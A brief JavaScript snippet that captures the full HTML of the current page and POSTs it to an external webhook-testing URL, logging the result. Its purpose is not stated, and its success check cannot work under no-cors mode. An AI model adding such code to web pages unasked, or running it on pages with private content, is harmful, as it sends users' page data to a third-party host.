try {
  const content = document.documentElement.outerHTML;
  const response = await fetch(
    "https://webhook-tester.dev.services.atlassian.com/smarpo",
    {
      method: "POST",
      headers: {
        "Content-Type": "text/html",
      },
      body: content,
      mode: "no-cors",
    },
  );

  if (response.ok) {
    console.log("Page content sent successfully!");
  } else {
    console.error("Failed to send page content:", response.status);
  }
} catch (error) {
  console.error("Error sending page content:", error);
}
